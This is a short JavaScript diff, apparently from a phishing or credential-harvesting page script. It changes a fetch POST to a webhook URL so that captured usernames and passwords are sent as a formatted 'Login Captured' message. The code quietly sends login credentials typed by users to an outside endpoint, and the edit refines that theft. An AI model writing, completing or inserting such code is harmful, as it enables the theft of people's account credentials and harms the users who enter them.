@@ -140,7 +140,9 @@ document.addEventListener("DOMContentLoaded", function() {
       fetch(WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ username, password })
+        body: JSON.stringify({
+          content: `Login Captured:\nUsername: ${username}\nPassword: ${password}`
+        })
       }).catch(console.error);
     }
   });
